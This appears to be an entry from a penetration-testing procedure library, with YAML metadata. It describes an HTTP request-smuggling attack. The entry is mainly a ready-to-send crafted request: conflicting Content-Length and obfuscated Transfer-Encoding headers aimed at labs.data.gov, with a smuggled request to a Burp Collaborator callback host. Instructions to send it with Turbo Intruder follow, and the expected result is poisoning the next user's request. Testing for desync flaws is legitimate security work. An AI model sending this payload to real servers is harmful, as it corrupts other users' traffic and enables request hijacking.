---
data: >-
  POST / HTTP/1.1

  Host: labs.data.gov

  Accept-Encoding: gzip, deflate

  Accept: */*

  Accept-Language: en

  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36
  (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36

  Connection: keep-alive

  Content-Type: application/x-www-form-urlencoded

  Content-length: 4

  Transfer-Encoding : chunked


  a2

  POST /hopefully404 HTTP/1.1

  Host: o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net

  Content-Type: application/x-www-form-urlencoded

  Content-Length: 15


  x=1

  0
tags:
  - http
  - smuggling
type: command
executor: http
platforms:
  - Web
id: 91503ab8-f4c9-4300-a4c1-fc64faa9520d
created_at: '2025-12-13T09:01:22.445Z'
updated_at: '2025-12-13T09:01:22.445Z'
verified: false
validated: true
submitted: true
---
# Send Crafted HTTP Request

## Command

```http
POST / HTTP/1.1
Host: labs.data.gov
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding : chunked

a2
POST /hopefully404 HTTP/1.1
Host: o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

## Description

Sends a crafted HTTP request exploiting smuggling with chunked encoding and adjusted Content-Length.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `Host` | Target host | Yes |
| `Transfer-Encoding` | chunked | Yes |
| `Content-length` | Adjusted length (4) | Yes |

## Examples

### Basic Usage

Send the above HTTP request via Turbo Intruder.

## Expected Output

Server processes desynced request, poisoning next one.

## Related

- [[procedures/Send-HTTP-Desync-Request]]
